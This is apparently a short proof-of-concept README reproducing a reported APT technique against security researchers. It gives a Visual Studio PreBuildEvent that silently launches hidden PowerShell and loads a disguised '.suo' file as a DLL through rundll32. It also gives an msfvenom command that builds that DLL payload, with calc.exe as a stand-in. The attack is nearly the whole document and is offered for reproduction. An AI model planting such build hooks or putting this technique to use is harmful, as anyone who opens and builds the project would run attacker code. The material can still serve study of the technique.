# VisualStudioPreBuildPwn-POC
Recent APT exploitation method POC 


https://www.bleepingcomputer.com/news/security/north-korean-hackers-are-targeting-security-researchers-with-malware-0-days/


```
<PreBuildEvent>
powershell -ep b -win h if(([system.environment]::osversion.version.major -eq 10) -and [system.environment]::is64bitoperatingsystem -and (Test-Path $(TargetName).vxproj.suo)){rundll32 $(TargetName).vxproj.suo,CMS_dataFinal Bx9yb37GEcJNK6bt 4901}
</PreBuildEvent>
```



msfvenom -p windows/exec CMD='calc.exe' -f dll > targetname.vxproj.suo
